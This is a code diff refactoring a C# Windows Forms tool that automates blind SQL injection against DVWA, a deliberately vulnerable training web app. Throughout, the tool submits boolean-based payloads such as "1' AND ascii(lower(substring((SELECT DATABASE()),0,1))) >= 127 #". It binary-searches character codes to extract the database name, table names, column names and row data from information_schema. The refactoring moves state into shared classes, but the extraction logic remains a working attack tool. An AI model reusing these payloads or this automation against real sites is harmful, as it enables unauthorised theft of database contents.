@@ -31,9 +31,6 @@ namespace Tool_SqlInjectionBlind_Dvwa
 
         private string html;
 
-
-        private string sql;
-
         #region Creating drag form by pnl_ControlBar
         [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
         public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
@@ -72,19 +69,80 @@ namespace Tool_SqlInjectionBlind_Dvwa
             wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click"); // call event click button submit
         }
 
-
-        int left = 0;
-        int right = 255;
-        int mid = 127;
         bool btn_Click = false;
         bool is_Done = false;
-        string str_result = "";
 
-        int index = 0;
-        bool count_Tables_Done = false;
-        bool is_Click_btn_DatabaseName = false;
-        bool is_Click_btn_TablesName = false;
+        private void Init_DataTable()
+        {
+            for (int tb = 0; tb < Variable.Quantity_Tables; tb++)
+            {
+                List<List<string>> data_table = new List<List<string>>();
+                for (int row = 0; row < Variable.Quantity_Row[tb]; row++)
+                {
+                    List<string> data_row = new List<string>();
+                    for (int col = 0; col < Variable.Quantity_Columns[tb]; col++)
+                    {
+                        data_row.Add("");
+                    }
+                    data_table.Add(data_row);
+                }
+                Variable.Bd_DataTable.Add(data_table);
+            }
+        }
 
+        private void Change_IndexCols_Whent_GetDataTable()
+        {
+            while (true)
+            {
+                if (Variable.Index_Tables >= Variable.Quantity_Tables)
+                {
+                    return;
+                }
+                else
+                {
+                    if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
+                    {
+                        Variable.Index_Columns = 0;
+                        Variable.Index_Rows++;
+                        if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
+                        {
+                            Variable.Index_Rows = 0;
+                            Variable.Index_Tables++;
+                        }
+                    }
+                    else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
+                    {
+                        Variable.Index_Columns++;
+                    }
+                    else
+                        break;
+                }
+            }
+        }
+
+        private DataTable Fill_Data_To_DataTable()
+        {
+            DataTable d_table = new DataTable(cmb_Tables.Text);
+            DataColumn d_col;
+            DataRow d_row;
+
+            for (int col = 0; col < Variable.Quantity_Columns[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)]; col++)
+            {
+                d_col = new DataColumn(Variable.Db_ColumnsName[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][col]);
+                d_table.Columns.Add(d_col);
+            }
+
+            for (int row = 0; row < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)].Count; row++)
+            {
+                d_row = d_table.NewRow();
+                for (int col = 0; col < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row].Count; col++)
+                {
+                    d_row[col] = Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row][col];
+                }
+                d_table.Rows.Add(d_row);
+            }
+            return d_table;
+        }
 
         private void wbro_Brower_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
@@ -98,74 +156,45 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 ResultRequest.Result result = Handing.GetResultSubmit(html_Document_Current);
                 ResultRequest.Job work_state = ResultRequest.Job.None;
 
-                if (is_Click_btn_DatabaseName)
-                {
-                    work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DB_Name,
-                        ref sql, ref left, ref right, ref mid, ref str_result);
-                }
-                else if(is_Click_btn_TablesName)
-                {
-                    if (count_Tables_Done)
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.TABLES_NAME,
-                            ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                    else
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.TABLES_NAME,
-                            ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                }
-                else if(Confirm.Is_Click_btnGNameColumns)
-                {
-                    if(Confirm.Find_Quantity_Done)
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.COLUMNS_NAME,
-                            ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                    else
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.COLUMNS_NAME,
-                           ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                }
-                else if(Confirm.Is_Click_btnGetData)
-                {
-                    if(!Confirm.Find_Quantity_Row_Done.Contains(false))
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DATA_TABLE,
-                            ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                    else
-                    {
-                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.DATA_TABLE,
-                            ref sql, ref left, ref right, ref mid, ref str_result);
-                    }
-                }
+                int left, mid, right, index;
+                string str_result, sql;
+                left = mid = right = index = 0;
+                str_result = sql = "";
 
+                Variable.Get_Data_Variable(ref left, ref mid, ref right, ref index, ref str_result, ref sql);
+
+                work_state = Handing.Get_Result_Respond(result, ref sql, ref left, ref right, ref mid, ref str_result);
+
+                Variable.Set_Data_Variable(left, mid, right, index, str_result, sql);
 
                 if (work_state == ResultRequest.Job.Done_ALL)
                 {
-                    if(is_Click_btn_DatabaseName)
+                    if(Confirm.Is_Click_btnGDatabaseName)
                     {
-                        is_Click_btn_DatabaseName = false;
+                        Confirm.Is_Click_btnGDatabaseName = false;
+                        btn_Click = false;
+                        btn_GetDBName.Enabled = false;
+                        Variable.Left = 0; Variable.Right = 255; Variable.Mid = 127; Variable.Index_str = 0;
+                        Variable.Str_result = "";
+                        return;
                     }
-                    else if(is_Click_btn_TablesName)
+                    else if(Confirm.Is_Click_btnGNameTables)
                     {
-                        if(count_Tables_Done) // print table name
+                        if(Confirm.Count_Tables_Done) // print table name
                         {
-                            index = 0;
+                            Variable.Index_str = 0;
                             if (Variable.Index_Tables < Variable.Quantity_Tables)
                             {
                                 Variable.Index_Tables++;
-                                left = 0; right = 255; mid = 127;
+                                lbl_TBsName.Text += "     ";
+                                Variable.Left = 0; Variable.Right = 255; Variable.Mid = 127;
                                 btn_GetTBsName.PerformClick();
                                 return;
                             }
                             else // all done
                             {
-                                index = 0;
-                                is_Click_btn_TablesName = false;
+                                Variable.Index_str = 0;
+                                Confirm.Is_Click_btnGNameTables = false;
                                 btn_Click = false;
 
                                 cmb_TbsName.Items.Add(Variable.Db_TablesName);
@@ -174,10 +203,12 @@ namespace Tool_SqlInjectionBlind_Dvwa
                         }
                         else
                         {
-                            lbl_Count_TBsName.Text += str_result;
-                            Variable.Quantity_Tables = Convert.ToInt32(str_result);
-                            count_Tables_Done = true;
-                            left = 0; right = 255; mid = 127; index = 0;
+                            lbl_Count_TBsName.Text += Variable.Str_result;
+                            Variable.Quantity_Tables = Convert.ToInt32(Variable.Str_result);
+                            Confirm.Count_Tables_Done = true;
+
+                            Variable.Reset_Data_Variable();
+
                             btn_GetTBsName.PerformClick();
                             return;
                         }
@@ -193,17 +224,20 @@ namespace Tool_SqlInjectionBlind_Dvwa
                                 Variable.Index_Columns = 0;
                                 Variable.Index_Tables++;
                             }
-                            index = 0; left = 0; right = 255; mid = 127;
+
+                            Variable.Reset_Data_Variable();
+
                             btn_GetColsName.PerformClick();
                             return;
                         }
                         else
                         {
-                            Variable.Quantity_Columns[Variable.Index_Tables] = Convert.ToInt32(str_result);
-                            str_result = "";
-                            Variable.Index_Tables++; 
+                            Variable.Quantity_Columns[Variable.Index_Tables] = Convert.ToInt32(Variable.Str_result);
+                            Variable.Str_result = "";
+                            Variable.Index_Tables++;
 
-                            left = 0; right = 255; mid = 127; index = 0;
+                            Variable.Reset_Data_Variable();
+
                             btn_GetColsName.PerformClick();
                             return;
                         }
@@ -212,10 +246,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         if(Confirm.Find_Quantity_Row_Done.Contains(false)) //don't complete
                         {
-                            Variable.Quantity_Row[Variable.Index_Tables] = Convert.ToInt32(str_result);
+                            Variable.Quantity_Row[Variable.Index_Tables] = Convert.ToInt32(Variable.Str_result);
                             Confirm.Find_Quantity_Row_Done[Variable.Index_Tables] = true;
 
-                            left = 0; right = 255; mid = 127; index = 0;
+                            Variable.Reset_Data_Variable();
                             btn_GetData.PerformClick();
 
                             return;
@@ -236,97 +270,46 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             }
                             else
                             {
-                                while (true)
-                                {
-                                    if (Variable.Index_Tables >= Variable.Quantity_Tables)
-                                    {
-                                        return;
-                                    }
-                                    else
-                                    {
-                                        if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
-                                        {
-                                            Variable.Index_Columns = 0;
-                                            Variable.Index_Rows++;
-                                            if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
-                                            {
-                                                Variable.Index_Rows = 0;
-                                                Variable.Index_Tables++;
-                                            }
-                                        }
-                                        else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
-                                        {
-                                            Variable.Index_Columns++;
-                                        }
-                                        else
-                                            break;
-                                    }
-                                }
+                                Change_IndexCols_Whent_GetDataTable();
                             }
-
-                            index = 0; left = 0; right = 255; mid = 127;
+                            Variable.Reset_Data_Variable();
                             btn_GetData.PerformClick();
                             return;
                         }
                     }
-
-                    btn_Click = false;
-
                 }
                 else if(work_state == ResultRequest.Job.Done_OnePart)
                 {
-                    if (is_Click_btn_DatabaseName)
+                    if (Confirm.Is_Click_btnGDatabaseName)
                     {
-                        lbl_Result_DBName.Text += str_result;
-                        Variable.Db_Name += str_result;
+                        lbl_Result_DBName.Text += Variable.Str_result;
+                        Variable.Db_Name += Variable.Str_result;
 
-                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
+                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DB_Name);
                     }
-                    else if(is_Click_btn_TablesName)
+                    else if(Confirm.Is_Click_btnGNameTables)
                     {
-                        Variable.Db_TablesName[Variable.Index_Tables] += str_result;
-                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
+                        Variable.Db_TablesName[Variable.Index_Tables] += Variable.Str_result;
+                        lbl_TBsName.Text += Variable.Str_result;
+                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.TABLES_NAME);
                     }
                     else if(Confirm.Is_Click_btnGNameColumns)
                     {
-                        Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] += str_result;
-                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);
+                        Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] += Variable.Str_result;
+                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.COLUMNS_NAME);
                     }
                     else if(Confirm.Is_Click_btnGetData)
                     {
-                        Variable.Bd_DataTable[Variable.Index_Tables][Variable.Index_Rows][Variable.Index_Columns] += str_result;
-                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DATA_TABLE, ref index);
-
-                        DataTable d_table = new DataTable(cmb_Tables.Text);
-                        DataColumn d_col;
-                        DataRow d_row;
-
-                        for(int col = 0; col < Variable.Quantity_Columns[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)]; col++)
-                        {
-                            d_col = new DataColumn(Variable.Db_ColumnsName[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][col]);
-                            d_table.Columns.Add(d_col);
-                        }
-
-                        for(int row = 0; row < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)].Count; row++)
-                        {
-                            d_row = d_table.NewRow();
-                            for (int col = 0; col < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row].Count; col++)
-                            {
-                                d_row[col] = Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row][col];
-                            }
-                            d_table.Rows.Add(d_row);
-                        }
-
-                        dgv_Data.DataSource = d_table;
+                        Variable.Bd_DataTable[Variable.Index_Tables][Variable.Index_Rows][Variable.Index_Columns] += Variable.Str_result;
+                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DATA_TABLE);
                         
+                        dgv_Data.DataSource = Fill_Data_To_DataTable();
                     }
-                    
-
-                    PutData(sql);
+                    PutData(Variable.Sql_Request);
                 }
                 else if(work_state == ResultRequest.Job.Continue)
                 {   
-                    PutData(sql);
+                    PutData(Variable.Sql_Request);
                 }
             }
 
@@ -348,12 +331,13 @@ namespace Tool_SqlInjectionBlind_Dvwa
         private void button1_Click(object sender, EventArgs e)
         {
             btn_Click = true;
-            is_Click_btn_DatabaseName = true;
+            Confirm.Is_Click_btnGDatabaseName = true;
 
-            sql = "1' AND ascii(lower(substring((SELECT DATABASE()), 0,1))) >= 127 #";
+            Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT DATABASE()), 0,1))) >= 127 #";
 
-            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
-            PutData(sql);
+            Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DB_Name);
+
+            PutData(Variable.Sql_Request);
 
             btn_GetDBName.Enabled = false;
         }
@@ -363,9 +347,9 @@ namespace Tool_SqlInjectionBlind_Dvwa
         {
             btn_Click = true;
 
-            is_Click_btn_TablesName = true;
+            Confirm.Is_Click_btnGNameTables = true;
 
-            if (count_Tables_Done)
+            if (Confirm.Count_Tables_Done)
             {
                 if(Variable.Db_TablesName.Count == 0)
                 {
@@ -374,11 +358,14 @@ namespace Tool_SqlInjectionBlind_Dvwa
                         Variable.Db_TablesName.Add("");
                     }
                 }
-                sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
+                Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                 if (Variable.Index_Tables < Variable.Quantity_Tables)
                 {
-                    sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
-                    PutData(sql);
+                    int index = Variable.Index_str;
+                    Variable.Sql_Request = Variable.Sql_Request.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
+                    Variable.Index_str = index;
+
+                    PutData(Variable.Sql_Request);
                 }
                 else
                 {
@@ -386,19 +373,21 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         lbl_TBsName.Text += " '" + str + "'";
                     }
+                    Variable.Reset_Data_Variable();
+
                     btn_GetTBsName.Enabled = false;
-                    is_Click_btn_TablesName = false;
-                    count_Tables_Done = false;
-                    str_result = "";
+                    Confirm.Is_Click_btnGNameTables = false;
+                    Confirm.Count_Tables_Done = false;
+                    Variable.Str_result = "";
                 }
             }
             else
             {
                 Variable.Index_Tables = 0;
 
-                sql = "1' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE 'dvwa') >= 127 #";
+                Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE 'dvwa') >= 127 #";
 
-                PutData(sql);
+                PutData(Variable.Sql_Request);
             }
 
         }
@@ -425,18 +414,18 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             Variable.Db_ColumnsName.Add(temp);
                         }
                         Variable.Index_Columns = Variable.Index_Tables = 0;
-                        index = 0;
+                        Variable.Index_str = 0;
                     }
                     //ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                     
                     if(Variable.Index_Tables < Variable.Quantity_Tables)
                     {
-                        sql = "1' AND ascii(lower(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "' LIMIT 0, 1), 0, 1))) >= 127 #";
+                        Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "' LIMIT 0, 1), 0, 1))) >= 127 #";
                         if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                         {
-                            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);
+                            Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.COLUMNS_NAME);
 
-                            PutData(sql);
+                            PutData(Variable.Sql_Request);
                         }
                     }
                     else
@@ -462,7 +451,7 @@ namespace Tool_SqlInjectionBlind_Dvwa
                         btn_Click = false;
                         Variable.Index_Columns = Variable.Index_Tables = 0;
                         Confirm.Is_Click_btnGNameColumns = false;
-                        left = 0; right = 255; mid = 127; index = 0;
+                        Variable.Reset_Data_Variable();
 
                         return;
                     }
@@ -482,9 +471,9 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
 
                         //sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE 'guestbook') >= 127 #";
-                        sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "') >= 127 #";
+                        Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "') >= 127 #";
 
-                        PutData(sql);
+                        PutData(Variable.Sql_Request);
                     }
                     else //find done
                     {
@@ -512,20 +501,7 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         if (Variable.Bd_DataTable.Count == 0)
                         {
-                            for (int tb = 0; tb < Variable.Quantity_Tables; tb++)
-                            {
-                                List<List<string>> data_table = new List<List<string>>();
-                                for (int row = 0; row < Variable.Quantity_Row[tb]; row++)
-                                {
-                                    List<string> data_row = new List<string>();
-                                    for (int col = 0; col < Variable.Quantity_Columns[tb]; col++)
-                                    {
-                                        data_row.Add("");
-                                    }
-                                    data_table.Add(data_row);
-                                }
-                                Variable.Bd_DataTable.Add(data_table);
-                            }
+                            Init_DataTable();
                             Variable.Index_Columns = Variable.Index_Rows = Variable.Index_Tables = 0;
                         }
 
@@ -534,6 +510,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             if (Variable.Index_Tables >= Variable.Quantity_Tables)
                             {
                                 List<List<List<string>>> a = Variable.Bd_DataTable;
+
+                                Variable.Index_Tables = Variable.Index_Columns = Variable.Index_Rows = 0;
+                                Variable.Reset_Data_Variable();
+
                                 return;
                             }
                             else
@@ -557,16 +537,16 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             }
                         }
 
-                        sql = "1' AND ascii(lower(substring((SELECT " + Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] + " from dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + " LIMIT 0, 1), 0, 1))) >= 127 #";
+                        Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT " + Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] + " from dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + " LIMIT 0, 1), 0, 1))) >= 127 #";
                         if (Variable.Index_Tables < Variable.Quantity_Tables)
                         {
                             if (Variable.Index_Rows < Variable.Quantity_Row[Variable.Index_Tables])
                             {
                                 if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                                 {
-                                    sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DATA_TABLE, ref index);
+                                    Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DATA_TABLE);
 
-                                    PutData(sql);
+                                    PutData(Variable.Sql_Request);
                                 }
                             }
                             else
@@ -586,10 +566,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                                 Variable.Quantity_Row.Add(0);
                             }
                             Variable.Index_Tables = 0;
-                            str_result = "";
-                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
+                            Variable.Str_result = "";
+                            Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
 
-                            PutData(sql);
+                            PutData(Variable.Sql_Request);
                         }
                         else
                         {
@@ -603,10 +583,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                                 }
                             }
                             //count row
-                            str_result = "";
-                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
+                            Variable.Str_result = "";
+                            Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
 
-                            PutData(sql);
+                            PutData(Variable.Sql_Request);
 
                         }
                     }
@@ -649,6 +629,21 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     clb_ColsName.SetItemChecked(idex, true);
                 }
             }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void cmb_Cols_Name_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
         }
     }
 }
